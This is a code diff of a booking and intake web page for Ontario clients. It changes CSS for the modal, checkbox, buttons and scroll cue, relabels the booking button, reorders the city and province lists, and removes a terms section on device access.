@@ -303,34 +303,38 @@
             overflow-x: hidden;
         }
 
-        /* Custom Scrollbar */
+        /* Page scrollbar styling only (do not override nested system scrollbars) */
         html {
             scrollbar-width: thin; /* For Firefox */
             scrollbar-color: #5a3d2a transparent; /* thumb track */
             overflow-x: hidden;
         }
-        body::-webkit-scrollbar,
-        *::-webkit-scrollbar {
+        html::-webkit-scrollbar,
+        body::-webkit-scrollbar {
             width: 0.5rem;
             height: 0.5rem;
         }
-        body::-webkit-scrollbar-track,
-        *::-webkit-scrollbar-track {
+        html::-webkit-scrollbar-track,
+        body::-webkit-scrollbar-track {
             background: transparent;
         }
-        body::-webkit-scrollbar-thumb,
-        *::-webkit-scrollbar-thumb {
+        html::-webkit-scrollbar-thumb,
+        body::-webkit-scrollbar-thumb {
             background-color: #5a3d2a;
             border-radius: 0.6rem;
         }
-        body::-webkit-scrollbar-thumb:hover,
-        *::-webkit-scrollbar-thumb:hover {
+        html::-webkit-scrollbar-thumb:hover,
+        body::-webkit-scrollbar-thumb:hover {
             background-color: #6B5B4A;
         }
-        *::-webkit-scrollbar-button,
-        *::-webkit-scrollbar-button:single-button,
-        *::-webkit-scrollbar-button:start:decrement,
-        *::-webkit-scrollbar-button:end:increment {
+        html::-webkit-scrollbar-button,
+        html::-webkit-scrollbar-button:single-button,
+        html::-webkit-scrollbar-button:start:decrement,
+        html::-webkit-scrollbar-button:end:increment,
+        body::-webkit-scrollbar-button,
+        body::-webkit-scrollbar-button:single-button,
+        body::-webkit-scrollbar-button:start:decrement,
+        body::-webkit-scrollbar-button:end:increment {
             display: none !important;
             width: 0 !important;
             height: 0 !important;
@@ -723,92 +727,104 @@
         }
 
         .contact-form__checkbox {
-            width: clamp(1.72rem, 2.4vw, 1.88rem);
-            height: clamp(1.72rem, 2.4vw, 1.88rem);
+            width: 1.55rem;
+            height: 1.55rem;
+            border-radius: 0.48rem;
+            margin: 0;
             padding: 0;
             appearance: none;
             -webkit-appearance: none;
-            border: 2.35px solid rgba(255, 255, 255, 0.8);
+            border: 2px solid rgba(255, 255, 255, 0.9);
+            background: rgba(255, 255, 255, 0.16);
             cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
             flex-shrink: 0;
+            transform: scale(1);
             position: relative;
-            border-radius: 0.58rem;
-            background: linear-gradient(160deg, rgba(255, 255, 255, 0.22) 0%, rgba(255, 255, 255, 0.05) 100%);
-            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.28), 0 0.45rem 0.9rem rgba(35, 22, 12, 0.18);
-            transition: transform 0.16s ease, border-color 0.2s ease, box-shadow 0.2s ease, background-color 0.2s ease;
+            transition: transform 0.14s ease, filter 0.14s ease, background-color 0.14s ease, border-color 0.14s ease;
         }
 
         .contact-form__checkbox::after {
-            content: '';
+            content: "✓";
             position: absolute;
             left: 50%;
             top: 50%;
-            width: 0.5rem;
-            height: 0.92rem;
-            border: solid #ffffff;
-            border-width: 0 0.18rem 0.18rem 0;
+            transform: translate(-50%, -62%) scale(0.8);
+            color: #5a3d2a;
+            font-size: 1.52rem;
+            font-weight: 900;
+            line-height: 1;
             opacity: 0;
-            transform: translate(-50%, -58%) rotate(45deg) scale(0.25);
-            transform-origin: center;
-            transition: opacity 0.16s ease, transform 0.2s ease;
+            transition: opacity 0.14s ease, transform 0.14s ease;
         }
 
         .contact-form__checkbox:hover {
-            border-color: rgba(255, 255, 255, 0.92);
-            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.35), 0 0.55rem 1.1rem rgba(35, 22, 12, 0.24);
-            transform: translateY(-1px);
+            transform: scale(1.03);
+            filter: brightness(1.05);
         }
 
         .contact-form__checkbox:active {
-            transform: translateY(0) scale(0.96);
+            transform: scale(0.98);
         }
 
         .contact-form__checkbox:focus-visible {
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.25), 0 0.45rem 0.9rem rgba(35, 22, 12, 0.24);
+            outline: 2px solid rgba(255, 255, 255, 0.65);
+            outline-offset: 2px;
         }
 
         .contact-form__checkbox:checked {
-            border-color: rgba(255, 255, 255, 0.97);
-            background: linear-gradient(145deg, rgba(126, 103, 83, 0.96) 0%, rgba(92, 73, 58, 0.96) 100%);
-            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.22), 0 0.55rem 1.15rem rgba(43, 27, 16, 0.3);
+            transform: scale(1);
+            background: #ffffff;
+            border-color: #ffffff;
         }
 
         .contact-form__checkbox:checked::after {
             opacity: 1;
-            transform: translate(-50%, -58%) rotate(45deg) scale(1);
-            animation: checkboxCheckIn 0.22s ease-out;
+            transform: translate(-50%, -64%) scale(1);
         }
 
         .contact-form__checkbox:checked:hover {
-            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.26), 0 0.7rem 1.2rem rgba(43, 27, 16, 0.34);
-        }
-
-        @keyframes checkboxCheckIn {
-            from { opacity: 0; transform: translate(-50%, -58%) rotate(45deg) scale(0.25); }
-            to { opacity: 1; transform: translate(-50%, -58%) rotate(45deg) scale(1); }
+            transform: scale(1.03);
         }
 
         .contact-form__checkbox-label {
-            font-size: 0.95rem;
-            font-weight: 700;
+            font-size: 1.08rem;
+            font-weight: 900;
             cursor: pointer;
             font-family: 'Lato', sans-serif !important;
-            letter-spacing: 0;
+            letter-spacing: 0.01em;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
         }
         
         .contact-form__terms-link {
             color: #ffffff;
-            text-decoration: underline;
+            text-decoration: none;
             cursor: pointer;
-            transition: color 0.3s ease;
-            font-weight: 800;
+            transition: none;
+            font-weight: 900;
+            font-size: 1.02em;
+            display: flex;
+            align-items: center;
+            text-shadow: none;
         }
 
-        .contact-form__terms-link:hover { color: #D4B89A; }
+        .contact-form__terms-link:hover {
+            color: #ffffff;
+            text-shadow: none;
+        }
+
+        .faq-google-form-link {
+            color: #ffffff !important;
+            display: inline-flex;
+            align-items: center;
+            white-space: nowrap;
+        }
+
+        .faq-google-form-link:hover {
+            color: #ffffff !important;
+        }
 
         .recaptcha-wrap {
             display: none;
@@ -873,15 +889,17 @@
         }
 
         #confirmBookingBtn:hover {
-            background: #4a3324 !important;
-            color: #ffffff !important;
+            background: #ffffff !important;
+            border-color: #ffffff !important;
+            color: #5a3d2a !important;
             transform: none;
             box-shadow: none;
         }
 
         #confirmBookingBtn:active {
-            background: #4a3324 !important;
-            color: #ffffff !important;
+            background: #ffffff !important;
+            border-color: #ffffff !important;
+            color: #5a3d2a !important;
             transform: none;
         }
 
@@ -1348,10 +1366,10 @@
             position: sticky;
             left: auto;
             right: auto;
-            bottom: 0;
+            bottom: -0.55rem;
             z-index: 25;
             margin: 0;
-            padding: 5.8rem 0.65rem 4rem;
+            padding: clamp(5.2rem, 12vh, 6.8rem) 0.65rem 0.6rem;
             background: linear-gradient(
                 to bottom,
                 rgba(107, 91, 74, 0.00) 0%,
@@ -1387,12 +1405,13 @@
             z-index: 1;
         }
 
-        /* Defensive: keep sticky container visuals from eating taps on action buttons */
-        #bookingModal .modal-sticky-actions {
-            pointer-events: auto;
+        /* Decorative sticky layer must not block taps on underlying content */
+        #bookingModal[data-state="form"] .modal-sticky-actions {
+            pointer-events: none;
         }
 
-        #bookingModal .modal-sticky-actions > * {
+        /* Keep actual controls clickable */
+        #bookingModal[data-state="form"] .modal-sticky-actions > * {
             position: relative;
             z-index: 3;
             pointer-events: auto;
@@ -1440,6 +1459,10 @@
             justify-items: center;
             align-content: end;
             gap: 0.15rem;
+        }
+
+        #bookingModal #hearAboutInput {
+            margin-bottom: clamp(0.25rem, 1vh, 0.55rem);
         }
 
         #bookingModal[data-state="form"] #bookingForm .modal-sticky-actions #bookingRecaptchaWrap,
@@ -1504,53 +1527,78 @@
 
         #bookingModal {
             --booking-form-font-size: 1.2rem;
-            overflow-y: auto;
+            --booking-modal-vpad: clamp(0.55rem, 1.8vh, 0.95rem);
+            --booking-modal-max-height: calc(100vh - (var(--booking-modal-vpad) * 2));
+            --booking-modal-max-height: calc(100dvh - (var(--booking-modal-vpad) * 2));
+            overflow-y: hidden;
             overflow-x: hidden;
-            scrollbar-width: auto;
-            scrollbar-color: auto;
-        }
-
-        #bookingModal::-webkit-scrollbar {
-            width: initial;
-        }
-
-        #bookingModal::-webkit-scrollbar-track {
-            background: initial;
-        }
-
-        #bookingModal::-webkit-scrollbar-thumb {
-            background: initial;
-            border-radius: initial;
         }
 
         #bookingModal.modal--active {
-            align-items: flex-start !important;
-            padding-top: 0.6rem;
-            padding-bottom: 0.6rem;
+            align-items: center !important;
+            padding-top: var(--booking-modal-vpad);
+            padding-bottom: var(--booking-modal-vpad);
         }
 
         #bookingModal[data-state="form"].modal--active {
-            padding-bottom: 0 !important;
+            padding-top: var(--booking-modal-vpad) !important;
+            padding-bottom: var(--booking-modal-vpad) !important;
         }
 
         #bookingModal .modal__content {
-            overflow: visible;
-            max-height: none;
-            height: auto;
+            overflow: hidden;
+            max-height: var(--booking-modal-max-height);
+            height: var(--booking-modal-max-height);
+            min-height: 0;
             margin: 0 auto;
+            display: flex;
+            flex-direction: column;
         }
 
         #bookingModal .modal__body {
-            flex: 0 0 auto;
-            min-height: auto;
-            overflow: visible;
+            flex: 1 1 auto;
+            min-height: 0;
+            overflow-y: auto;
+            overflow-x: hidden;
+            overscroll-behavior: contain;
+            -ms-overflow-style: none;
+            scrollbar-width: none;
             padding-bottom: 0;
         }
 
+        #bookingModal .modal__body::-webkit-scrollbar {
+            width: 0;
+            height: 0;
+            display: none;
+        }
+
         #bookingModal[data-state="form"] .modal__body {
+            --booking-top-fade-height: clamp(2.4rem, 6.4vh, 3.8rem);
+            position: relative;
             display: block;
-            overflow: visible;
+            overflow-y: auto;
+            overflow-x: hidden;
+            padding-top: 0 !important;
             padding-bottom: 0;
+        }
+
+        #bookingModal[data-state="form"] .modal__body::before {
+            content: "";
+            position: sticky;
+            top: 0;
+            display: block;
+            height: var(--booking-top-fade-height);
+            margin-bottom: calc(var(--booking-top-fade-height) * -1);
+            z-index: 24;
+            pointer-events: none;
+            background: linear-gradient(
+                to bottom,
+                rgba(107, 91, 74, 1) 0%,
+                rgba(107, 91, 74, 0.96) 24%,
+                rgba(107, 91, 74, 0.72) 52%,
+                rgba(107, 91, 74, 0.34) 76%,
+                rgba(107, 91, 74, 0) 100%
+            );
         }
 
         #bookingModal #bookingForm {
@@ -1560,9 +1608,13 @@
             flex-direction: column;
         }
 
+        #bookingModal[data-state="form"] #bookingForm > .contact-form__group:first-child > div {
+            margin-top: 0 !important;
+        }
+
         #bookingModal[data-state="form"] #bookingForm {
-            flex: 0 0 auto;
-            min-height: auto;
+            flex: 1 1 auto;
+            min-height: 100%;
             overflow: visible;
             padding-bottom: 0;
         }
@@ -1598,6 +1650,10 @@
             letter-spacing: 0.01em !important;
         }
 
+        #bookingModal #deadlineInputMain::placeholder {
+            text-align: center !important;
+        }
+
         #bookingModal .booking-row--address-city {
             width: 100%;
         }
@@ -1614,7 +1670,7 @@
         }
 
         #bookingModal .booking-row--address-secondary {
-            justify-content: flex-start !important;
+            justify-content: center !important;
             align-items: center !important;
             flex-wrap: nowrap !important;
             gap: 0.55rem !important;
@@ -1630,10 +1686,10 @@
         }
 
         #bookingModal .custom-select-wrapper--province {
-            flex: 0 0 98px !important;
-            width: 98px !important;
-            min-width: 98px !important;
-            max-width: 98px !important;
+            flex: 0 0 148px !important;
+            width: 148px !important;
+            min-width: 148px !important;
+            max-width: 148px !important;
             margin-bottom: 0 !important;
         }
 
@@ -1880,6 +1936,33 @@
             --booking-status-fg: #ffe8f3;
             --booking-status-border: rgba(255, 116, 179, 0.98);
             --booking-status-bg: rgba(255, 120, 184, 0.16);
+        }
+
+        .booking-scroll-cue {
+            width: min(100%, 37.5rem);
+            margin: 0 0 0.45rem 0;
+            text-align: center;
+            pointer-events: none;
+            user-select: none;
+            line-height: 1;
+        }
+
+        .booking-scroll-cue span {
+            display: inline-block;
+            margin: 0 0.1rem;
+            color: rgba(255, 255, 255, 0.95);
+            font-size: 1.02rem;
+            font-weight: 900;
+            animation: bookingScrollChevron 1.2s ease-in-out infinite;
+        }
+
+        .booking-scroll-cue span:nth-child(2) { animation-delay: 0.15s; }
+        .booking-scroll-cue span:nth-child(3) { animation-delay: 0.3s; }
+
+        @keyframes bookingScrollChevron {
+            0% { opacity: 0.15; transform: translateY(-2px) scale(0.96); }
+            35% { opacity: 1; transform: translateY(1px) scale(1.04); }
+            100% { opacity: 0.15; transform: translateY(4px) scale(0.96); }
         }
 
         .contact-form__input.field-invalid,
@@ -2985,9 +3068,9 @@
         .file-attach__btn--camera {
             border-style: solid;
             border-width: 2px;
-            border-color: #ffffff;
-            background: #ffffff;
-            color: #5a3d2a;
+            border-color: #5a3d2a;
+            background: #5a3d2a;
+            color: #ffffff;
             width: 5.25rem;
             min-width: 5.25rem;
             height: 5.25rem;
@@ -3023,23 +3106,23 @@
 
         .file-attach__btn--camera .file-attach__icon-svg,
         .file-attach__btn--camera .file-attach__icon-svg--camera {
-            color: #5a3d2a !important;
-            stroke: #5a3d2a !important;
+            color: #ffffff !important;
+            stroke: #ffffff !important;
         }
 
         .file-attach__btn--camera:hover .file-attach__icon-svg,
         .file-attach__btn--camera:hover .file-attach__icon-svg--camera,
         .file-attach__btn--camera:focus-visible .file-attach__icon-svg,
         .file-attach__btn--camera:focus-visible .file-attach__icon-svg--camera {
-            color: #ffffff !important;
-            stroke: #ffffff !important;
+            color: #5a3d2a !important;
+            stroke: #5a3d2a !important;
         }
 
         .file-attach__btn--camera:hover,
         .file-attach__btn--camera:focus-visible {
-            background: #5a3d2a !important;
-            border-color: #5a3d2a !important;
-            color: #ffffff !important;
+            background: #ffffff !important;
+            border-color: #ffffff !important;
+            color: #5a3d2a !important;
         }
 
         .file-attach__btn:hover,
@@ -3454,6 +3537,23 @@
             transition: max-height 0.36s cubic-bezier(.22, .61, .36, 1), opacity 0.24s ease, visibility 0.24s ease;
         }
 
+        #bookingModal .custom-select--city .custom-select__trigger.has-city-check {
+            padding-right: 4.15rem;
+        }
+
+        #bookingModal .custom-select--city .custom-select__trigger.has-city-check::before {
+            content: '\2713';
+            position: absolute;
+            right: 2.45rem;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.32rem;
+            font-weight: 900;
+            line-height: 1;
+            color: #ffffff;
+            pointer-events: none;
+        }
+
         #bookingModal .custom-select--city.open .custom-options {
             max-height: var(--city-options-open-height, 18rem);
         }
@@ -3508,11 +3608,66 @@
         }
         .footer-book-btn:hover {
             transform: none;
-            background: #4a3324;
+            background: #ffffff;
+            border-color: #ffffff;
+            color: #5a3d2a;
             box-shadow: none;
         }
         .footer-book-btn:hover::before {
             content: none;
+        }
+
+        .footer-book-btn:hover #headerBookBtnText,
+        .footer-book-btn:hover #headerBookBtnText span,
+        .footer-book-btn:hover #footerBookBtnText,
+        .footer-book-btn:hover #footerBookBtnText span {
+            color: #5a3d2a !important;
+        }
+
+        button,
+        [role="button"],
+        .footer-book-btn,
+        .contact-form__submit-button,
+        .slot-btn,
+        .calendar-nav-btn,
+        .slots-nav-arrow,
+        .file-attach__btn {
+            transition: transform 0.2s ease;
+        }
+
+        button:hover,
+        [role="button"]:hover,
+        .footer-book-btn:hover,
+        .contact-form__submit-button:hover,
+        .slot-btn:hover,
+        .calendar-nav-btn:hover,
+        .slots-nav-arrow:hover,
+        .file-attach__btn:hover {
+            transform: scale(1.01) !important;
+        }
+
+        .header__content-text,
+        .modal__text,
+        .faq__answer,
+        .footer__hours,
+        .footer__copyright,
+        .contact-form__label,
+        .contact-form__checkbox-label,
+        .final-result-label,
+        .final-result-value {
+            transition: transform 0.2s ease;
+        }
+
+        .header__content-text:hover,
+        .modal__text:hover,
+        .faq__answer:hover,
+        .footer__hours:hover,
+        .footer__copyright:hover,
+        .contact-form__label:hover,
+        .contact-form__checkbox-label:hover,
+        .final-result-label:hover,
+        .final-result-value:hover {
+            transform: scale(1.01);
         }
 
         #headerBookBtn {
@@ -4578,7 +4733,7 @@
 
             .booking-row--address-secondary {
                 flex-wrap: wrap;
-                justify-content: flex-start !important;
+                justify-content: center !important;
                 align-items: center !important;
             }
 
@@ -4614,10 +4769,10 @@
             }
 
             .booking-row--province-zip .custom-select-wrapper--province {
-                flex: 0 0 98px !important;
-                width: 98px !important;
-                min-width: 98px !important;
-                max-width: 98px !important;
+                flex: 0 0 148px !important;
+                width: 148px !important;
+                min-width: 148px !important;
+                max-width: 148px !important;
             }
 
             .booking-row--address-city .custom-select-wrapper--city {
@@ -4711,7 +4866,7 @@
                 display: flex !important;
                 flex-wrap: wrap !important;
                 gap: 0.55rem !important;
-                justify-content: flex-start !important;
+                justify-content: center !important;
                 align-items: center !important;
             }
 
@@ -4738,10 +4893,10 @@
             }
 
             #bookingModal .booking-row--province-zip .custom-select-wrapper--province {
-                flex: 0 0 98px !important;
-                width: 98px !important;
-                min-width: 98px !important;
-                max-width: 98px !important;
+                flex: 0 0 148px !important;
+                width: 148px !important;
+                min-width: 148px !important;
+                max-width: 148px !important;
             }
 
             #bookingModal input[name="address_zip"] {
@@ -4835,7 +4990,7 @@
                 <div class="book-btn-preloader__text" style="text-align: center; line-height: 1.2; display: none;"></div>
             </div>
             <button class="footer-book-btn" id="headerBookBtn" onclick="bookNearestSlot()" style="opacity: 0; transform: scale(0.9); pointer-events: none;">
-                <span id="headerBookBtnText">INTAKE<br>NOW!</span>
+                <span id="headerBookBtnText">BOOK</span>
             </button>
         </div>
         <p id="headerNearestSlotHint" class="header-nearest-slot-hint" aria-live="polite"></p>
@@ -5035,7 +5190,7 @@
         <div class="faq__item">
             <h3 class="faq__question">Was there an earlier way to register?</h3>
             <div class="faq__answer">
-                The prior registration process remains accessible at its original URL and existing links will continue to direct users to the original intake <a href="https://docs.google.com/forms/d/1brLzvNv2tR9jDvG4Z9vUZLvzzpgZHmOhHPZ7_x8g8Qo" target="_blank" rel="noopener noreferrer" style="color:white; text-decoration: underline;">Google Form</a>.
+                The prior registration process remains accessible at its original URL and existing links will continue to direct users to the original intake: <a href="https://docs.google.com/forms/d/1brLzvNv2tR9jDvG4Z9vUZLvzzpgZHmOhHPZ7_x8g8Qo" target="_blank" rel="noopener noreferrer" class="contact-form__terms-link faq-google-form-link">Google Form</a>
             </div>
         </div>
 
@@ -5116,9 +5271,6 @@
             <h3 class="modal__section-title">8. Prohibited Use</h3>
             <p class="modal__text">By accessing or using this website and its related services, you agree to be bound by the following conditions. You must not post, transmit, or distribute any material that is unlawful, threatening, abusive, harassing, defamatory, obscene, invasive of privacy, or that incites hatred, discrimination, or violence. You must not impersonate any individual or entity, or misrepresent your identity, affiliation, or authority. You must not solicit, collect, or disclose another person's login credentials, passwords, payment card details, or other financial information. You must not manipulate headers, metadata, or technical identifiers to disguise the origin of any content. You must not submit or share content that infringes upon intellectual property rights, privacy rights, or any other legal rights of third parties. You must not send unsolicited advertising, promotional materials, bulk communications, spam, chain letters, or pyramid schemes. You must not introduce malware, viruses, or any code designed to disrupt, disable, or damage software, hardware, or communication systems. You must not employ automated tools such as bots, crawlers, spiders, or scrapers to access, copy, monitor, or extract website content without prior written authorization. You must not reverse engineer, decompile, disassemble, reproduce, duplicate, or otherwise exploit any portion of this website without express written permission. You must not interfere with the operation of the website, its servers, or connected networks, nor attempt to bypass security measures or access controls. You must not access, collect, store, alter, or process another user's personal information without lawful authority. You must not modify, hack, or otherwise alter the website, nor falsely suggest endorsement, partnership, or affiliation with this website. You must not use this website for any unlawful, unauthorized, or rights-violating purpose, including any breach of applicable Canadian laws and regulations.</p>
 
-            <h3 class="modal__section-title">9. Device Access and Data Collection</h3>
-            <p class="modal__text">To enhance your experience and ensure the proper functioning of our services, this website may request access to certain device features and collect technical information. With your explicit consent, we may use your device's microphone and camera to enable interactive features, improve communication, and provide the best possible user experience. We may collect and store technical information about your device, including operating system details, browser type, IP address, usage logs, and performance data, for security, analytics, and service improvement purposes. You will be prompted to grant or deny permission when such access is requested, and you may revoke these permissions at any time through your browser or device settings.</p>
-
             <h2 class="modal__title" style="margin-top: 50px; margin-bottom: 20px; font-size: 1.8rem;" data-i18n="privacyPolicy">Privacy Policy</h2>
 
             <h3 class="modal__section-title" data-i18n="infoCollection">1. Information Collection</h3>
@@ -5159,7 +5311,7 @@
                     <div class="book-btn-preloader__text" style="text-align: center; line-height: 1.2; display: none;"></div>
                 </div>
                 <button class="footer-book-btn" id="footerBookBtn" onclick="bookNearestSlot()" style="opacity: 1; transform: scale(1); pointer-events: auto;">
-                    <span id="footerBookBtnText">INTAKE<br>NOW!</span>
+                    <span id="footerBookBtnText">BOOK</span>
                 </button>
 </div>
         </div>
@@ -5188,7 +5340,7 @@
 
                 <div class="contact-form__group">
                     <!-- Calendar Section -->
-                    <div style="margin-top: 20px; padding: 12px; background: rgba(255, 255, 255, 0.05); border-radius: 8px; display: flex; align-items: center; justify-content: flex-start; gap: 12px; text-align: left; flex-wrap: wrap;">
+                    <div style="margin-top: 20px; padding: 12px; background: rgba(255, 255, 255, 0.05); border-radius: 0.8rem; display: flex; align-items: center; justify-content: flex-start; gap: 12px; text-align: left; flex-wrap: wrap; cursor: pointer;" onclick="document.getElementById('openCalendarBtn').click()">
                         <button type="button" class="file-attach__btn file-attach__btn--camera file-attach__btn--calendar" id="openCalendarBtn" aria-label="Open calendar" style="margin: 0; flex: 0 0 auto;">
                             <span class="file-attach__title">
                                 <span class="file-attach__icon">
@@ -5204,7 +5356,7 @@
                                 </span>
                             </span>
                         </button>
-                        <p style="margin: 0; color: var(--text-white); font-size: 0.9rem; line-height: 1.4; flex: 1 1 240px;">You can click the calendar button to choose dates and times for each appointment.</p>
+                        <p style="margin: 0; color: var(--text-white); font-size: 0.9rem; line-height: 1.4; flex: 1 1 240px;">You can click this calendar button to choose dates and times for each appointment.</p>
                     </div>
                 </div>
                 
@@ -5254,21 +5406,21 @@
                                     <span>City</span>
                                 </button>
                                 <div class="custom-options">
-                                    <div class="custom-option" data-value="London">London</div>
+                                    <div class="custom-option" data-value="Toronto">Toronto</div>
+                                    <div class="custom-option" data-value="Richmond Hill">Richmond Hill</div>
+                                    <div class="custom-option" data-value="Mississauga">Mississauga</div>
+                                    <div class="custom-option" data-value="Oakville">Oakville</div>
+                                    <div class="custom-option" data-value="Burlington">Burlington</div>
+                                    <div class="custom-option" data-value="Hamilton">Hamilton</div>
+                                    <div class="custom-option" data-value="Milton">Milton</div>
+                                    <div class="custom-option" data-value="Guelph">Guelph</div>
                                     <div class="custom-option" data-value="Kitchener">Kitchener</div>
                                     <div class="custom-option" data-value="Waterloo">Waterloo</div>
                                     <div class="custom-option" data-value="Cambridge">Cambridge</div>
-                                    <div class="custom-option" data-value="Guelph">Guelph</div>
-                                    <div class="custom-option" data-value="Hamilton">Hamilton</div>
-                                    <div class="custom-option" data-value="Burlington">Burlington</div>
-                                    <div class="custom-option" data-value="Oakville">Oakville</div>
-                                    <div class="custom-option" data-value="Mississauga">Mississauga</div>
-                                    <div class="custom-option" data-value="Brampton">Brampton</div>
-                                    <div class="custom-option" data-value="Toronto">Toronto</div>
-                                    <div class="custom-option" data-value="Richmond Hill">Richmond Hill</div>
-                                    <div class="custom-option" data-value="Milton">Milton</div>
-                                    <div class="custom-option" data-value="Brantford">Brantford</div>
                                     <div class="custom-option" data-value="Woodstock">Woodstock</div>
+                                    <div class="custom-option" data-value="London">London</div>
+                                    <div class="custom-option" data-value="Brampton">Brampton</div>
+                                    <div class="custom-option" data-value="Brantford">Brantford</div>
                                     <div class="custom-option" data-value="Stratford">Stratford</div>
                                     <div class="custom-option" data-value="St. Thomas">St. Thomas</div>
                                     <div class="custom-option" data-value="Sarnia">Sarnia</div>
@@ -5284,27 +5436,27 @@
                             <input type="hidden" name="address_city" id="cityInput" value="">
                         </div>
                     </div>
-                    <div class="booking-row booking-row--address-secondary booking-row--province-zip" style="display: flex; gap: 10px; justify-content: flex-start; align-items: center;">
-                        <label for="provinceTriggerMain" class="contact-form__label booking-row__label" style="margin:0; text-align:left; color:var(--text-white); flex:0 0 auto; text-transform:none; letter-spacing:0;">Province:</label>
+                    <div class="booking-row booking-row--address-secondary booking-row--province-zip" style="display: flex; gap: 10px; justify-content: center; align-items: center;">
+                        <label for="provinceTriggerMain" class="contact-form__label booking-row__label" style="margin:0; text-align:right; color:var(--text-white); flex:0 0 auto; text-transform:none; letter-spacing:0;">Province:</label>
                         <div class="custom-select-wrapper custom-select-wrapper--province">
                             <div class="custom-select custom-select--province" id="provinceCustomSelect">
                                 <button class="custom-select__trigger" id="provinceTriggerMain" type="button" aria-label="Province">
                                     <span>Ontario</span>
                                 </button>
                                 <div class="custom-options">
+                                    <div class="custom-option selected" data-value="Ontario">Ontario</div>
                                     <div class="custom-option" data-value="Alberta">Alberta</div>
-                                    <div class="custom-option" data-value="British Columbia">British Columbia</div>
                                     <div class="custom-option" data-value="Manitoba">Manitoba</div>
+                                    <div class="custom-option" data-value="Nunavut">Nunavut</div>
+                                    <div class="custom-option" data-value="Quebec">Quebec</div>
+                                    <div class="custom-option" data-value="Yukon">Yukon</div>
+                                    <div class="custom-option" data-value="British Columbia">British Columbia</div>
                                     <div class="custom-option" data-value="New Brunswick">New Brunswick</div>
                                     <div class="custom-option" data-value="Newfoundland and Labrador">Newfoundland and Labrador</div>
                                     <div class="custom-option" data-value="Northwest Territories">Northwest Territories</div>
                                     <div class="custom-option" data-value="Nova Scotia">Nova Scotia</div>
-                                    <div class="custom-option" data-value="Nunavut">Nunavut</div>
-                                    <div class="custom-option selected" data-value="Ontario">Ontario</div>
                                     <div class="custom-option" data-value="Prince Edward Island">Prince Edward Island</div>
-                                    <div class="custom-option" data-value="Quebec">Quebec</div>
                                     <div class="custom-option" data-value="Saskatchewan">Saskatchewan</div>
-                                    <div class="custom-option" data-value="Yukon">Yukon</div>
                                 </div>
                             </div>
                             <input id="provinceInputMain" type="hidden" name="address_province" value="Ontario">
@@ -5317,33 +5469,39 @@
                     <textarea class="contact-form__textarea" rows="3" maxlength="3000" placeholder="Brief details about your case area..." name="notes" style="text-align: left;"></textarea>
                     
                     <!-- File Attachment moved under Brief Case Area -->
-                    <div class="file-attach" style="margin-top: 15px; padding: 12px; background: rgba(255, 255, 255, 0.05); border-radius: 8px;">
-                        <input type="file" id="fileAttachInput" multiple accept="image/*,.pdf,.doc,.docx" style="display: none;">
+                    <div class="file-attach" style="margin-top: 15px; padding: 12px; background: rgba(255, 255, 255, 0.05); border-radius: 0.8rem;">
+                        <input type="file" id="fileAttachInput" multiple accept="image/*,video/*,.pdf,.doc,.docx" style="display: none;">
                         <input type="file" id="cameraFallbackInput" accept="image/*" capture="environment" style="display: none;">
-                        <div class="file-attach__controls" style="display: flex; flex-wrap: wrap; gap: 10px; align-items: center;">
-                            <button type="button" class="file-attach__btn file-attach__btn--camera" id="takePhotoBtn">
-                                <span class="file-attach__title">
-                                    <span class="file-attach__icon">
-                                        <svg class="file-attach__icon-svg file-attach__icon-svg--camera" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width: 1.25em; height: 1.25em;">
-                                            <path d="M4 7h3l2-2h6l2 2h3a1 1 0 0 1 1 1v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a1 1 0 0 1 1-1z"></path>
-                                            <circle cx="12" cy="13" r="4"></circle>
-                                        </svg>
+                        <div class="file-attach__controls" style="display: flex; flex-wrap: wrap; gap: 10px; align-items: stretch;">
+                            <div style="width: 100%; display: flex; align-items: center; gap: 10px; border: 2px dashed rgba(255, 255, 255, 0.4); border-radius: 0.8rem; padding: 8px 10px; background: rgba(255, 255, 255, 0.03); cursor: pointer;" onclick="document.getElementById('takePhotoBtn').click()">
+                                <button type="button" class="file-attach__btn file-attach__btn--camera" id="takePhotoBtn">
+                                    <span class="file-attach__title">
+                                        <span class="file-attach__icon">
+                                            <svg class="file-attach__icon-svg file-attach__icon-svg--camera" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width: 1.25em; height: 1.25em;">
+                                                <path d="M4 7h3l2-2h6l2 2h3a1 1 0 0 1 1 1v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a1 1 0 0 1 1-1z"></path>
+                                                <circle cx="12" cy="13" r="4"></circle>
+                                            </svg>
+                                        </span>
                                     </span>
-                                </span>
-                            </button>
-                            <p style="margin: 0; color: var(--text-white); font-size: 0.9rem; line-height: 1.4; text-align: left; flex: 1 1 240px;">Click this camera icon to take photos of documents on a table or car hood with good lighting, or of the incident scene when feasible.</p>
-                            <button type="button" class="file-attach__btn" onclick="document.getElementById('fileAttachInput').click()" style="width: 100%; margin-top: 8px;">
-                                <span class="file-attach__title">
-                                    <span class="file-attach__icon">
-                                        <svg class="file-attach__icon-svg file-attach__icon-svg--paperclip" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width: 1.25em; height: 1.25em;">
-                                            <path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"></path>
-                                        </svg>
+                                </button>
+                                <p style="margin: 0; color: var(--text-white); font-size: 0.9rem; line-height: 1.4; text-align: left; flex: 1 1 240px;">Tap this camera icon to take photos of documents on a table or car hood and of the incident scene when feasible.</p>
+                            </div>
+                            <div class="file-attach__list" id="cameraAttachList" style="width: 100%;"></div>
+
